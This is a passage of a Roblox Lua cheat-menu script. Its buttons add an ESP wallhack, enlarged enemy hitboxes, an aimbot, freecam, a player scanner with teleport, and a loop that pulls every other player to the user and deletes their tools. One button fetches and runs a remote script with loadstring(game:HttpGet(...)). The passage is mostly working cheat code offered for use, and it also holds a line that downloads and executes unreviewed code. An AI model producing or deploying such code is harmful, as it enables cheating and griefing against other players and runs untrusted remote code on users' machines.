		toggleButton.Text = "ON"

		local id = inputBox.Text
		if id == "" then
			warn("No music ID entered")
			return
		end

		if remote then
			pcall(function()
				remote:FireServer("newSound", soundName, InjectTo, "rbxassetid://" .. id, 1, 1, true, 0)
				remote:FireServer("playSound", soundName)
			end)
		else
			warn("AC6 RemoteEvent not found")
		end
	else
		toggleButton.Text = "OFF"

		if remote then
			pcall(function()
				remote:FireServer("stopSound", soundName)
			end)
		end
	end
end)
end)

addMainMenuButton("ESP PLAYER (MONSY)", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local toggleButton = Instance.new("TextButton")
toggleButton.Size = UDim2.new(0, 100, 0, 35)
toggleButton.Position = UDim2.new(0, 20, 0, 120)
toggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggleButton.TextColor3 = Color3.fromRGB(0,0,0)
toggleButton.Text = "ESP: ON"
toggleButton.Font = Enum.Font.Roboto
toggleButton.TextSize = 14
toggleButton.Parent = gui

local corner = Instance.new("UICorner", toggleButton)
corner.CornerRadius = UDim.new(0, 6)

--// Toggle State
local ESP_ENABLED = true
local ESPObjects = {}

--// Drawing Helpers
local function newLine()
	local line = Drawing.new("Line")
	line.Thickness = 2
	line.Color = Color3.fromRGB(255, 255, 255) -- Changed to white
	line.Visible = true
	return line
end

local function newText()
	local text = Drawing.new("Text")
	text.Size = 14
	text.Color = Color3.fromRGB(255, 255, 255)
	text.Center = true
	text.Outline = true
	text.Visible = true
	return text
end

local function clearESP(player)
	if ESPObjects[player] then
		for _, obj in pairs(ESPObjects[player]) do
			if obj.Remove then obj:Remove() end
		end
		ESPObjects[player] = nil
	end
end

--// Get 2D screen position of 3D part
local function getPartPos(part)
	if not part then return nil, false end
	local pos, visible = Camera:WorldToViewportPoint(part.Position)
	return Vector2.new(pos.X, pos.Y), visible
end

--// ESP Rendering
RunService.RenderStepped:Connect(function()
	if not ESP_ENABLED then
		for _, v in pairs(ESPObjects) do
			for _, obj in pairs(v) do
				obj.Visible = false
			end
		end
		return
	end

	for _, player in ipairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character then
			local char = player.Character
			local esp = ESPObjects[player]

			if not esp then
				esp = {
					HeadToTorso = newLine(),
					TorsoToLeftArm = newLine(),
					TorsoToRightArm = newLine(),
					TorsoToLeftLeg = newLine(),
					TorsoToRightLeg = newLine(),
					Name = newText(),
				}
				ESPObjects[player] = esp
			end

			local headPos, headVis = getPartPos(char:FindFirstChild("Head"))
			local torsoPos, torsoVis = getPartPos(char:FindFirstChild("HumanoidRootPart"))
			local laPos, laVis = getPartPos(char:FindFirstChild("LeftUpperArm") or char:FindFirstChild("Left Arm"))
			local raPos, raVis = getPartPos(char:FindFirstChild("RightUpperArm") or char:FindFirstChild("Right Arm"))
			local llPos, llVis = getPartPos(char:FindFirstChild("LeftUpperLeg") or char:FindFirstChild("Left Leg"))
			local rlPos, rlVis = getPartPos(char:FindFirstChild("RightUpperLeg") or char:FindFirstChild("Right Leg"))

			if headVis and torsoVis then
				esp.HeadToTorso.From = headPos
				esp.HeadToTorso.To = torsoPos
				esp.HeadToTorso.Visible = true
			else
				esp.HeadToTorso.Visible = false
			end

			if torsoVis and laVis then
				esp.TorsoToLeftArm.From = torsoPos
				esp.TorsoToLeftArm.To = laPos
				esp.TorsoToLeftArm.Visible = true
			else
				esp.TorsoToLeftArm.Visible = false
			end

			if torsoVis and raVis then
				esp.TorsoToRightArm.From = torsoPos
				esp.TorsoToRightArm.To = raPos
				esp.TorsoToRightArm.Visible = true
			else
				esp.TorsoToRightArm.Visible = false
			end

			if torsoVis and llVis then
				esp.TorsoToLeftLeg.From = torsoPos
				esp.TorsoToLeftLeg.To = llPos
				esp.TorsoToLeftLeg.Visible = true
			else
				esp.TorsoToLeftLeg.Visible = false
			end

			if torsoVis and rlVis then
				esp.TorsoToRightLeg.From = torsoPos
				esp.TorsoToRightLeg.To = rlPos
				esp.TorsoToRightLeg.Visible = true
			else
				esp.TorsoToRightLeg.Visible = false
			end

			if headVis then
				esp.Name.Position = Vector2.new(headPos.X, headPos.Y - 20)
				esp.Name.Text = player.Name
				esp.Name.Visible = true
			else
				esp.Name.Visible = false
			end
		end
	end
end)

--// Player leave cleanup
Players.PlayerRemoving:Connect(function(player)
	clearESP(player)
end)

--// Toggle Button
toggleButton.MouseButton1Click:Connect(function()
	ESP_ENABLED = not ESP_ENABLED
	toggleButton.Text = ESP_ENABLED and "ESP: ON" or "ESP: OFF"
end)
end)

addMainMenuButton("BIG HEAD PLAYER (MONSY)", function()
	_G.HeadSize = 10 _G.Disabled = true game:GetService('RunService').RenderStepped:connect(function() if _G.Disabled then for i,v in next, game:GetService('Players'):GetPlayers() do if v.Name ~= game:GetService('Players').LocalPlayer.Name then pcall(function() v.Character.Head.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize) v.Character.Head.Transparency = 0.4 v.Character.Head.BrickColor = BrickColor.new("Red") v.Character.Head.Material = "Neon" v.Character.Head.CanCollide = false v.Character.Head.Massless = true end) end end end end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("KEYBIND Q TO FREECAM (MONSY)", function()
	-- Services
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local cam = workspace.CurrentCamera

-- Settings
local MOVE_SPEED = 60
local SPRINT_MULTIPLIER = 2
local MOUSE_SENSITIVITY = 0.15
local MAX_PITCH = 89

-- State
local enabled = false
local yaw = 0
local pitch = 0
local moveDir = Vector3.new()
local sprint = false
local originalCameraType
local originalMouseBehavior
local originalMouseIconEnabled
local humanoid
local savedWalkSpeed
local savedJumpPower
local justToggled = false -- NEW: para pigilan extra input sa frame ng toggle

-- Helpers for movement direction
local function addKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir += Vector3.new(0,0,1) end  -- forward
	if key == Enum.KeyCode.S then moveDir += Vector3.new(0,0,-1) end -- backward
	if key == Enum.KeyCode.A then moveDir += Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir += Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir += Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir += Vector3.new(0,-1,0) end
end

local function removeKeyDirection(key)
	if key == Enum.KeyCode.W then moveDir -= Vector3.new(0,0,1) end
	if key == Enum.KeyCode.S then moveDir -= Vector3.new(0,0,-1) end
	if key == Enum.KeyCode.A then moveDir -= Vector3.new(-1,0,0) end
	if key == Enum.KeyCode.D then moveDir -= Vector3.new(1,0,0) end
	if key == Enum.KeyCode.Space then moveDir -= Vector3.new(0,1,0) end
	if key == Enum.KeyCode.LeftControl or key == Enum.KeyCode.C then moveDir -= Vector3.new(0,-1,0) end
end

-- Toggle freecam
local function toggleFreecam()
	enabled = not enabled
	moveDir = Vector3.new() -- NEW: reset movement dir agad
	sprint = false
	justToggled = true

	if enabled then
		-- Save original states
		originalCameraType = cam.CameraType
		originalMouseBehavior = UserInputService.MouseBehavior
		originalMouseIconEnabled = UserInputService.MouseIconEnabled

		-- Freeze character
		if player.Character then
			humanoid = player.Character:FindFirstChildOfClass("Humanoid")
			if humanoid then
				savedWalkSpeed = humanoid.WalkSpeed
				savedJumpPower = humanoid.JumpPower
				humanoid.WalkSpeed = 0
				humanoid.JumpPower = 0
			end
		end

		-- Set yaw/pitch
		local x, y, z = cam.CFrame:ToEulerAnglesYXZ()
		pitch = math.deg(x)
		yaw = math.deg(y)

		cam.CameraType = Enum.CameraType.Scriptable
		UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
		UserInputService.MouseIconEnabled = false
	else
		-- Restore character movement
		if humanoid then
			humanoid.WalkSpeed = savedWalkSpeed or 16
			humanoid.JumpPower = savedJumpPower or 50
		end
		cam.CameraType = originalCameraType or Enum.CameraType.Custom
		UserInputService.MouseBehavior = originalMouseBehavior or Enum.MouseBehavior.Default
		UserInputService.MouseIconEnabled = originalMouseIconEnabled
	end
end

-- Keybinds
UserInputService.InputBegan:Connect(function(input, gpe)
	if gpe then return end

	if input.KeyCode == Enum.KeyCode.Q then
		toggleFreecam()
		return
	end

	if justToggled then return end -- NEW: block key presses sa toggle frame

	if enabled and input.UserInputType == Enum.UserInputType.Keyboard then
		if input.KeyCode == Enum.KeyCode.LeftShift then
			sprint = true
		else
			addKeyDirection(input.KeyCode)
		end
	end
end)

UserInputService.InputEnded:Connect(function(input, gpe)
	if gpe or not enabled then return end
	if justToggled then return end -- NEW: block releases sa toggle frame

	if input.KeyCode == Enum.KeyCode.LeftShift then
		sprint = false
	else
		removeKeyDirection(input.KeyCode)
	end
end)

-- Mouse look
UserInputService.InputChanged:Connect(function(input, gpe)
	if not enabled then return end
	if input.UserInputType == Enum.UserInputType.MouseMovement then
		yaw -= input.Delta.X * MOUSE_SENSITIVITY
		pitch = math.clamp(pitch - input.Delta.Y * MOUSE_SENSITIVITY, -MAX_PITCH, MAX_PITCH)
	end
end)

-- Camera movement
RunService.RenderStepped:Connect(function(dt)
	if justToggled then
		justToggled = false -- reset block flag after 1 frame
	end
	if not enabled then return end

	local rot = CFrame.Angles(0, math.rad(yaw), 0) * CFrame.Angles(math.rad(pitch), 0, 0)
	local localMove = (rot.RightVector * moveDir.X + rot.UpVector * moveDir.Y + rot.LookVector * moveDir.Z)
	local speed = MOVE_SPEED * (sprint and SPRINT_MULTIPLIER or 1)
	local newPos = cam.CFrame.Position + localMove * speed * dt
	cam.CFrame = CFrame.new(newPos) * rot
end)
end)

addMainMenuButton("AIMBOT ADJUSTABLE (MONSY)", function()
	--// CONFIG
getgenv().Environment = {
    FOVSettings = {
        Amount = 150,
        Visible = true,
        Color = Color3.fromRGB(255, 255, 255) -- White FOV
    },
    Aimbot = {
        Enabled = true,
        AimPart = "Head"
    }
}

--// SERVICES
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local Mouse = LocalPlayer:GetMouse()
local UIS = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

--// CREATE FOV CIRCLE
local Circle = Drawing.new("Circle")
Circle.Radius = Environment.FOVSettings.Amount
Circle.Thickness = 2
Circle.Transparency = 1
Circle.Filled = false
Circle.Color = Environment.FOVSettings.Color

--// UPDATE FOV CIRCLE POSITION
RunService.RenderStepped:Connect(function()
    Circle.Position = UIS:GetMouseLocation()
    Circle.Visible = Environment.FOVSettings.Visible
    Circle.Radius = Environment.FOVSettings.Amount
end)

--// AIMBOT FUNCTION
local function GetClosestPlayer()
    local closest, dist = nil, Environment.FOVSettings.Amount
    for _, player in pairs(Players:GetPlayers()) do
        if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(Environment.Aimbot.AimPart) then
            local headPos, onScreen = workspace.CurrentCamera:WorldToViewportPoint(player.Character[Environment.Aimbot.AimPart].Position)
            if onScreen then
                local mag = (Vector2.new(headPos.X, headPos.Y) - UIS:GetMouseLocation()).Magnitude
                if mag < dist then
                    closest = player
                    dist = mag
                end
            end
        end
    end
    return closest
end

RunService.RenderStepped:Connect(function()
    if Environment.Aimbot.Enabled and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestPlayer()
        if target then
            workspace.CurrentCamera.CFrame = CFrame.new(
                workspace.CurrentCamera.CFrame.Position,
                target.Character[Environment.Aimbot.AimPart].Position
            )
        end
    end
end)

--// GUI SETUP
local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local Title = Instance.new("TextLabel")
local SliderBack = Instance.new("Frame")
local SliderFill = Instance.new("Frame")
local SliderButton = Instance.new("TextButton")
local FOVLabel = Instance.new("TextLabel")
local ToggleButton = Instance.new("TextButton")

ScreenGui.Parent = game.CoreGui

-- Frame
Frame.Size = UDim2.new(0, 220, 0, 140)
Frame.Position = UDim2.new(0, 50, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

-- Title
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundTransparency = 1
Title.Text = "PUBLIC ENEMY AIMBOT" -- Custom Title
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.TextSize = 16
Title.Font = Enum.Font.Roboto
Title.Parent = Frame

-- Slider background
SliderBack.Size = UDim2.new(0.8, 0, 0, 6)
SliderBack.Position = UDim2.new(0.1, 0, 0.35, 0)
SliderBack.BackgroundColor3 = Color3.fromRGB(255,255,255) -- All black
SliderBack.BorderSizePixel = 0
SliderBack.Parent = Frame

-- Slider fill
SliderFill.Size = UDim2.new(0.5, 0, 1, 0)
SliderFill.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White fill
SliderFill.BorderSizePixel = 0
SliderFill.Parent = SliderBack

-- Slider button
SliderButton.Size = UDim2.new(0, 20, 0, 20)
SliderButton.Position = UDim2.new(0.5, -10, 0.5, -10)
SliderButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255) -- White button
SliderButton.Text = ""
SliderButton.BorderSizePixel = 0
SliderButton.Parent = Frame

-- FOV text display
FOVLabel.Size = UDim2.new(1, 0, 0, 20)
FOVLabel.Position = UDim2.new(0, 0, 0.45, 0)
FOVLabel.BackgroundTransparency = 1
FOVLabel.TextColor3 = Color3.fromRGB(0,0,0)
FOVLabel.TextSize = 14
FOVLabel.Font = Enum.Font.Roboto
FOVLabel.Text = "FOV: " .. Environment.FOVSettings.Amount
FOVLabel.Parent = Frame

-- Toggle button for Show/Hide
ToggleButton.Size = UDim2.new(0.8, 0, 0, 30)
ToggleButton.Position = UDim2.new(0.1, 0, 0.7, 0)
ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0)
ToggleButton.TextSize = 14
ToggleButton.Font = Enum.Font.Roboto
ToggleButton.Text = "FOV: Visible"
ToggleButton.Parent = Frame

-- FOV slider logic
local dragging = false

local function updateFOV(percent)
    percent = math.clamp(percent, 0, 1)
    SliderFill.Size = UDim2.new(percent, 0, 1, 0)
    SliderButton.Position = UDim2.new(percent, -10, 0.5, -10)
    local newFOV = math.floor(50 + percent * 400)
    Environment.FOVSettings.Amount = newFOV
    FOVLabel.Text = "FOV: " .. newFOV
end

SliderButton.MouseButton1Down:Connect(function()
    dragging = true
end)

UIS.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

UIS.InputChanged:Connect(function(input)
    if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
        local percent = (UIS:GetMouseLocation().X - SliderBack.AbsolutePosition.X) / SliderBack.AbsoluteSize.X
        updateFOV(percent)
    end
end)

-- Toggle FOV visibility
ToggleButton.MouseButton1Click:Connect(function()
    Environment.FOVSettings.Visible = not Environment.FOVSettings.Visible
    if Environment.FOVSettings.Visible then
        ToggleButton.Text = "FOV: Visible"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
    else
        ToggleButton.Text = "FOV: Hidden"
        ToggleButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
    end
end)

-- Initial setup
updateFOV((Environment.FOVSettings.Amount - 50) / 400)
end)

addMainMenuButton("FADED GUI UNIVERSAL (MONSY)", function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/NighterEpic/Faded-Grid/main/YesEpic", true))()
end)

addMainMenuButton("LOOP BRING ALL [3KTG]", function()
	--// Services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--// Variables
local loopEnabled = false
local originalPositions = {}

--// GUI
local ScreenGui = Instance.new("ScreenGui", game.CoreGui)

local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 100)
Frame.Position = UDim2.new(0.5, -150, 0, 50)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- all black
Frame.BorderSizePixel = 0
Frame.Active = true
Frame.Draggable = true

local UICorner = Instance.new("UICorner", Frame)
UICorner.CornerRadius = UDim.new(0, 6)

local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0.4, 0)
Title.BackgroundTransparency = 1
Title.Font = Enum.Font.Roboto
Title.TextSize = 18
Title.Text = "PUBLIC ENEMY LOOP BRING ALL"
Title.TextColor3 = Color3.fromRGB(0,0,0) -- white

local StatusButton = Instance.new("TextButton", Frame)
StatusButton.Size = UDim2.new(1, 0, 0.6, 0)
StatusButton.Position = UDim2.new(0, 0, 0.4, 0)
StatusButton.Font = Enum.Font.Roboto
StatusButton.TextSize = 20
StatusButton.Text = "OFF"
StatusButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black
StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- white text

--// Toggle Function
StatusButton.MouseButton1Click:Connect(function()
    loopEnabled = not loopEnabled

    if loopEnabled then
        -- Save original positions
        originalPositions = {}
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                originalPositions[plr.Name] = plr.Character.HumanoidRootPart.CFrame
            end
        end

        StatusButton.Text = "ON"
        StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- green text
    else
        -- Return players to original positions
        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                local savedPos = originalPositions[plr.Name]
                if savedPos then
                    plr.Character.HumanoidRootPart.CFrame = savedPos
                end
            end
        end

        StatusButton.Text = "OFF"
        StatusButton.TextColor3 = Color3.fromRGB(0,0,0) -- back to white text
    end
end)

--// Loop Bring All in Front
RunService.RenderStepped:Connect(function()
    if loopEnabled and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local hrp = LocalPlayer.Character.HumanoidRootPart
        local targetPos = hrp.Position + (hrp.CFrame.LookVector * 5)

        for _, plr in ipairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer and plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                -- Remove tools
                plr.Backpack:ClearAllChildren()
                for _, tool in pairs(plr.Character:GetChildren()) do
                    if tool:IsA("Tool") then
                        tool:Destroy()
                    end
                end

                -- Bring to front
                plr.Character.HumanoidRootPart.CFrame = CFrame.new(targetPos)
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PLAYER SCANNER (MONSY)", function()
	--// PUBLIC ENEMY PLAYER SCANNER
-- Solid black GUI + Modern font + Hover effects + Click animations + Working VIEW/UNVIEW/TELEPORT

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UIS = game:GetService("UserInputService")

-- Main ScreenGui
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

-- Main Frame
local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 400)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -200)
MainFrame.BackgroundColor3 = Color3.fromRGB(255,255,255)
MainFrame.BorderSizePixel = 0
MainFrame.Visible = true
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

-- UI Corner
local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 8)
MainCorner.Parent = MainFrame

-- Title
local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 40)
Title.BackgroundTransparency = 1
Title.Text = "PUBLIC ENEMY PLAYER SCANNER"
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 20
Title.Parent = MainFrame

-- Scan Button
local ScanButton = Instance.new("TextButton")
ScanButton.Size = UDim2.new(0.9, 0, 0, 35)
ScanButton.Position = UDim2.new(0.05, 0, 0, 50)
ScanButton.BackgroundColor3 = Color3.fromRGB(255,255,255)
ScanButton.TextColor3 = Color3.fromRGB(0,0,0)
ScanButton.Font = Enum.Font.Roboto
ScanButton.TextSize = 18
ScanButton.Text = "SCAN"
ScanButton.AutoButtonColor = false
ScanButton.Parent = MainFrame

local ScanCorner = Instance.new("UICorner")
ScanCorner.CornerRadius = UDim.new(0, 6)
ScanCorner.Parent = ScanButton

-- Hover effect
local function AddHoverEffect(button)
	button.MouseEnter:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
	end)
	button.MouseLeave:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
	button.MouseButton1Click:Connect(function()
		button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
		task.wait(0.1)
		button.BackgroundColor3 = Color3.fromRGB(255,255,255)
	end)
end
AddHoverEffect(ScanButton)

-- Scrollable Player List
local PlayerListFrame = Instance.new("ScrollingFrame")
PlayerListFrame.Size = UDim2.new(0.9, 0, 0, 280)
PlayerListFrame.Position = UDim2.new(0.05, 0, 0, 90)
PlayerListFrame.BackgroundTransparency = 1
PlayerListFrame.BorderSizePixel = 0
PlayerListFrame.ScrollBarThickness = 6
PlayerListFrame.ScrollBarImageColor3 = Color3.fromRGB(0, 0, 0)
PlayerListFrame.Parent = MainFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = PlayerListFrame
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 4)

-- Function to create each player entry
local function CreatePlayerButton(player)
	local PlayerButton = Instance.new("TextButton")
	PlayerButton.Size = UDim2.new(1, 0, 0, 30)
	PlayerButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
	PlayerButton.TextColor3 = Color3.fromRGB(0,0,0)
	PlayerButton.Font = Enum.Font.Roboto
	PlayerButton.TextSize = 16
	PlayerButton.Text = player.DisplayName .. " (@" .. player.Name .. ")"
	PlayerButton.AutoButtonColor = false
	PlayerButton.Parent = PlayerListFrame

	local PlayerCorner = Instance.new("UICorner")
	PlayerCorner.CornerRadius = UDim.new(0, 6)
	PlayerCorner.Parent = PlayerButton

	AddHoverEffect(PlayerButton)

	-- Actions Frame
	local ActionsFrame = Instance.new("Frame")
	ActionsFrame.Size = UDim2.new(1, 0, 0, 30)
	ActionsFrame.BackgroundTransparency = 1
	ActionsFrame.Visible = false
	ActionsFrame.Parent = PlayerListFrame

	local function CreateActionButton(text)
		local Btn = Instance.new("TextButton")
		Btn.Size = UDim2.new(0.3, 0, 1, 0)
		Btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
		Btn.TextColor3 = Color3.fromRGB(0,0,0)
		Btn.Font = Enum.Font.Roboto
		Btn.TextSize = 14
		Btn.Text = text
		Btn.AutoButtonColor = false
		Btn.Parent = ActionsFrame

		local BtnCorner = Instance.new("UICorner")
		BtnCorner.CornerRadius = UDim.new(0, 6)
		BtnCorner.Parent = Btn

		AddHoverEffect(Btn)
		return Btn
	end

	local ViewBtn = CreateActionButton("VIEW")
	local UnviewBtn = CreateActionButton("UNVIEW")
	local TeleportBtn = CreateActionButton("TELEPORT")

	ViewBtn.Position = UDim2.new(0, 0, 0, 0)
	UnviewBtn.Position = UDim2.new(0.35, 0, 0, 0)
	TeleportBtn.Position = UDim2.new(0.7, 0, 0, 0)

	-- === BUTTON FUNCTIONS ===
	ViewBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("Head") then
			workspace.CurrentCamera.CameraSubject = player.Character:FindFirstChild("Head")
		end
	end)

	UnviewBtn.MouseButton1Click:Connect(function()
		if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Humanoid") then
			workspace.CurrentCamera.CameraSubject = LocalPlayer.Character:FindFirstChild("Humanoid")
		end
	end)

	TeleportBtn.MouseButton1Click:Connect(function()
		if player.Character and player.Character:FindFirstChild("HumanoidRootPart") and
		   LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
			LocalPlayer.Character.HumanoidRootPart.CFrame =
				player.Character.HumanoidRootPart.CFrame + Vector3.new(2, 0, 0)
		end
	end)

	-- Show/hide action buttons
	PlayerButton.MouseButton1Click:Connect(function()
		ActionsFrame.Visible = not ActionsFrame.Visible
	end)
end

-- SCAN function
ScanButton.MouseButton1Click:Connect(function()
	for _, child in ipairs(PlayerListFrame:GetChildren()) do
		if child:IsA("TextButton") or child:IsA("Frame") then
			child:Destroy()
		end
	end

	task.spawn(function()
		for _, player in ipairs(Players:GetPlayers()) do
			if player ~= LocalPlayer then
				CreatePlayerButton(player)
				task.wait(0.15)
			end
		end
	end)
end)

-- Hide/Unhide with U
UIS.InputBegan:Connect(function(input, gp)
	if not gp and input.KeyCode == Enum.KeyCode.U then
		MainFrame.Visible = not MainFrame.Visible
	end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("AIM VIEWER (MONSY)", function()
	--// PUBLIC ENEMY AIM VIEWER //--

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local AimViewerEnabled = false
local playerLines = {}
local lineDistance = 50 -- haba ng line (studs)

-- GUI
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Parent = game.CoreGui

local Frame = Instance.new("Frame")
Frame.Size = UDim2.new(0, 200, 0, 60)
Frame.Position = UDim2.new(0.4, 0, 0.05, 0)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black bg
Frame.BorderSizePixel = 2
Frame.Active = true
Frame.Draggable = true
Frame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, 0, 0, 25)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black title bg
Title.Text = "PUBLIC ENEMY AIM VIEWER"
Title.TextColor3 = Color3.fromRGB(0,0,0) -- white text
Title.Font = Enum.Font.Roboto
Title.TextSize = 18
Title.Parent = Frame

local ToggleButton = Instance.new("TextButton")
ToggleButton.Size = UDim2.new(1, 0, 0, 35)
ToggleButton.Position = UDim2.new(0, 0, 0, 25)
ToggleButton.BackgroundColor3 = Color3.fromRGB(255,255,255) -- black bg
ToggleButton.Text = "Aim Viewer: OFF"
ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- red text (off)
ToggleButton.Font = Enum.Font.Roboto
ToggleButton.TextSize = 18
ToggleButton.Parent = Frame

-- Function para gumawa ng line
local function createLine()
    local line = Drawing.new("Line")
    line.Thickness = 1.5
    line.Transparency = 1
    line.Color = Color3.fromRGB(0, 0, 0) -- black line
    return line
end

-- Toggle function
ToggleButton.MouseButton1Click:Connect(function()
    AimViewerEnabled = not AimViewerEnabled
    if AimViewerEnabled then
        ToggleButton.Text = "Aim Viewer: ON"
        ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- green kapag on
    else
        ToggleButton.Text = "Aim Viewer: OFF"
        ToggleButton.TextColor3 = Color3.fromRGB(0,0,0) -- red kapag off
        for _, line in pairs(playerLines) do
            line.Visible = false
        end
    end
end)

-- Main loop
RunService.RenderStepped:Connect(function()
    if AimViewerEnabled then
        for _, plr in pairs(Players:GetPlayers()) do
            if plr ~= LocalPlayer then
                if not playerLines[plr] then
                    playerLines[plr] = createLine()
                end
                local line = playerLines[plr]
                local char = plr.Character
                if char and char:FindFirstChild("Head") then
                    local head = char.Head
                    local startPos, onScreen = Camera:WorldToViewportPoint(head.Position)
                    local endPos = head.Position + (head.CFrame.LookVector * lineDistance)
                    local endScreen, onScreen2 = Camera:WorldToViewportPoint(endPos)
                    if onScreen or onScreen2 then
                        line.From = Vector2.new(startPos.X, startPos.Y)
                        line.To = Vector2.new(endScreen.X, endScreen.Y)
                        line.Visible = true
                    else
                        line.Visible = false
                    end
                else
                    line.Visible = false
                end
            end
        end
    end
end)
end)

--// 8 Buttons in Main Menu
addMainMenuButton("HEAD DETECTOR (MONSY)", function()
	-- Local Anti-Headshot Detection GUI (Client-Side)
-- Detects if someone is aiming at your head
-- With ON/OFF toggle button + Hotkey (G)

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local UserInputService = game:GetService("UserInputService")

-- SETTINGS
local FOV_THRESHOLD = 5 -- degrees: smaller = stricter
local UPDATE_INTERVAL = 0.2 -- seconds
local detectionEnabled = true -- toggle state

-- ScreenGui Setup
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = ""
ScreenGui.Parent = game.CoreGui

-- Main Frame
local Frame = Instance.new("Frame", ScreenGui)
Frame.Size = UDim2.new(0, 300, 0, 200)
Frame.Position = UDim2.new(1, -310, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
Frame.BorderSizePixel = 0

-- Title
local Title = Instance.new("TextLabel", Frame)
Title.Size = UDim2.new(1, 0, 0, 30)
Title.BackgroundColor3 = Color3.fromRGB(255,255,255)
Title.TextColor3 = Color3.fromRGB(0,0,0)
Title.Font = Enum.Font.Roboto
Title.TextSize = 18
Title.Text = "Taong Goma Head Detector"

-- Player List
local PlayerList = Instance.new("TextLabel", Frame)
PlayerList.Size = UDim2.new(1, -10, 1, -40)
PlayerList.Position = UDim2.new(0, 5, 0, 35)
PlayerList.BackgroundTransparency = 1
PlayerList.TextColor3 = Color3.fromRGB(0,0,0)
PlayerList.Font = Enum.Font.Roboto
PlayerList.TextSize = 14
PlayerList.TextXAlignment = Enum.TextXAlignment.Left
PlayerList.TextYAlignment = Enum.TextYAlignment.Top
PlayerList.Text = "No threats detected."
PlayerList.RichText = true

